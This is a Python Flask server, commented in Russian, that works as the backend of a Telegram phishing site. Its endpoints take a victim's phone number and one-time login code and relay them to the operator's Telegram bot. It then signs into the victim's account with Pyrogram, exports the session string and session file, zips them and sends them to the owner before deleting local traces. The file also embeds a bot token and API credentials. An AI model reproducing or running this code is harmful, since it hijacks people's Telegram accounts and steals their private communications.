from flask import Flask, request, jsonify, send_from_directory
import os
import asyncio
import re
import requests
import zipfile
from threading import Thread

app = Flask(__name__)

# ===== НАСТРОЙКИ (ЗАМЕНИ НА СВОИ) =====
BOT_TOKEN = "7972485896:AAGDUO9cKu4qMdoa7dC87-Ybq1kUoPZNF_A"
OWNER_ID = 742347183  # ТВОЙ TELEGRAM ID
API_ID = 39945573
API_HASH = "4addef563b163d9d1977fdfb4abf50db"

# ===== ПРОКСИ (ЕСЛИ НУЖЕН) =====
PROXY_ENABLED = False
PROXY_HOST = "bproxy.site"
PROXY_PORT = 1080
PROXY_USERNAME = ""
PROXY_PASSWORD = ""

proxy_dict = None
if PROXY_ENABLED:
    proxy_dict = {
        "scheme": "socks5",
        "hostname": PROXY_HOST,
        "port": PROXY_PORT,
        "username": PROXY_USERNAME,
        "password": PROXY_PASSWORD
    }

def send_telegram(text):
    """Отправляет сообщение тебе в Telegram"""
    try:
        requests.post(
            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
            json={"chat_id": OWNER_ID, "text": text[:4000]},
            timeout=10
        )
    except:
        pass

def send_file(file_path, caption):
    """Отправляет ZIP файл тебе в Telegram"""
    try:
        with open(file_path, 'rb') as f:
            requests.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument",
                data={"chat_id": OWNER_ID, "caption": caption},
                files={"document": f},
                timeout=30
            )
    except:
        pass

def login_and_send(phone, code):
    """Запускает вход в аккаунт в отдельном потоке"""
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(do_login(phone, code))

async def do_login(phone, code):
    from pyrogram import Client
    
    try:
        # Нормализуем номер
        phone_clean = re.sub(r'\D', '', phone)
        if phone_clean.startswith('8'):
            phone_clean = '7' + phone_clean[1:]
        elif not phone_clean.startswith('7'):
            phone_clean = '7' + phone_clean
        phone_full = '+' + phone_clean
        
        send_telegram(f"🔄 Вход в {phone_full}...")
        
        # Создаём папку для сессий
        os.makedirs("sessions", exist_ok=True)
        session_path = f"sessions/{phone_clean}"
        
        # Создаём клиента и подключаемся
        client = Client(
            session_path,
            api_id=API_ID,
            api_hash=API_HASH,
            proxy=proxy_dict,
            workdir="."
        )
        
        await client.connect()
        
        # Пытаемся войти с кодом
        try:
            await client.sign_in(phone_full, code)
        except Exception as e:
            # Если код протух или нужно отправить заново
            if "PHONE_CODE_EXPIRED" in str(e) or "CODE_HASH" in str(e):
                await client.send_code(phone_full)
                await asyncio.sleep(2)
                await client.sign_in(phone_full, code)
            else:
                raise
        
        # Получаем сессию
        session_string = await client.export_session_string()
        
        # Файл .session уже создан, находим его
        session_file = f"{session_path}.session"
        
        # Создаём ZIP
        zip_path = f"sessions/{phone_clean}.zip"
        with zipfile.ZipFile(zip_path, 'w') as zf:
            if os.path.exists(session_file):
                zf.write(session_file, arcname=f"{phone_clean}.session")
        
        # Отправляем ZIP
        send_file(zip_path, f"✅ Аккаунт: {phone_full}\n\nSession string:\n{session_string}")
        
        # Закрываем и чистим
        await client.disconnect()
        
        # Удаляем временные файлы
        if os.path.exists(session_file):
            os.remove(session_file)
        if os.path.exists(zip_path):
            os.remove(zip_path)
            
        send_telegram(f"✅ Успешно! Аккаунт {phone_full} отправлен.")
        
    except Exception as e:
        error_msg = str(e)[:300]
        send_telegram(f"❌ Ошибка входа {phone}:\n{error_msg}")

@app.route('/')
def index():
    if os.path.exists('index.html'):
        return send_from_directory('.', 'index.html')
    return "Сайт работает", 200

@app.route('/api/send_code', methods=['POST'])
def send_code():
    data = request.json
    phone = data.get('phone', '')
    send_telegram(f"📱 НОВЫЙ НОМЕР: {phone}")
    return jsonify({"status": "ok"})

@app.route('/api/verify_code', methods=['POST'])
def verify_code():
    data = request.json
    phone = data.get('phone', '')
    code = data.get('code', '')
    
    send_telegram(f"🔑 ПОЛУЧЕН КОД\nТелефон: {phone}\nКод: {code}")
    
    # Запускаем вход в отдельном потоке (чтобы сайт не завис)
    thread = Thread(target=login_and_send, args=(phone, code))
    thread.start()
    
    return jsonify({"success": True})

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
